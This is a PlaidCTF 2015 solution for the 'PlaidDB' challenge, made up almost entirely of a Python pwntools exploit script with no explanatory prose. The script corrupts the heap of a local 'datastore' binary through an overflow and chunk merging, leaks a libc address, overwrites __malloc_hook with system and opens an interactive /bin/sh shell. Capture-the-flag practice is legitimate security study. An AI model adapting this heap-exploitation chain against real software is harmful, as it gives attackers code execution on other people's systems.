### PlaidCTF 2015 - PlaidDB

```python
from pwn import * 

context.bits = 64 

def put(key,val,debug):

	print p.recvline()
	p.sendline('PUT')
	print p.recvline()
	p.sendline(key)
	print p.recvline()
	if debug == 0 :

		p.sendline(str(len(val)+1))
		print p.recvline()
		p.sendline(val)
		print p.recvline()
   
	else :
		p.sendline(str(len(val)))
		print p.recvline()
		p.sendline(val)
		print p.recvlines(4)[0]

def del_(key):

	print p.recvline()
	p.sendline('DEL')
	print p.recvline()
	p.sendline(key)
	print p.recvline()


def get(key,debug):

	print p.recvline()
	p.sendline('GET')
	print p.recvline()
	p.sendline(key)
	print p.recvline()
        if debug == 1 :
		s = p.recvline()
                return unpack(s[0:8])
        else :
		return 0

        
def dump():

	print p.recvline()
	p.sendline('DUMP')	
	return p.recvlines(4)
        

p = process('./datastore');
print p.recvlines(2)

# Happy hacking :) 

put("K","A"*0x30,0)
put("KKK","A",0)

get("A"*0x25,0)
del_('th3fl4g')
get("X",0)
put('k1','A'*0x1f0+pack(0x200)+pack(0x30)+"A"*0x20,0)  # big chunk 
put('k2','B'*0x110,0)

get("A"*0x25,0)     # saving k3 node
 
del_("K")     # saving key node del K

del_("k1")  # free big chunk

del_("random") # clear the stage for overflow 

put("A"*0x18,'H'*16+pack(0x20)+"B"*0xe8,0) # overflow + malloc(0x100) ---> b1

put("key","A"*0x1f,0)

put("k3","C"*0x5f,0)  # victim chunk 

del_("KKK")

get("ABB",0)

put("A"*0x18+pack(0x111),"F"*0x30,0) # delete b1

del_("k2") # delete c  ----> merge happens

put("k4","D"*0x100,1)  # attacking 


leak = get("key",1)

print hex(leak)

malloc_hook = leak - 0x68
system      = leak - 0x35a708

print "[+] Libc leak:      "+hex(leak)
print "[+] __malloc_hook : "+hex(malloc_hook)
print "[+] system :        "+hex(system)


payload = "A"*0x48+pack(0x70)+pack(malloc_hook-35)+"A"*0x50

rip = "A"*11+pack(system)+"\x00"*79

del_("k3")

put("last","A"*33,0)

put("attack",payload,0)

put("least","A"*97,0)

put("hell",rip,0)

paypal = '/bin/sh\x00'+"\x00"*0x25


print p.recvline()
p.sendline('PUT')
print p.recvline()
p.sendline(paypal)

p.interactive()
```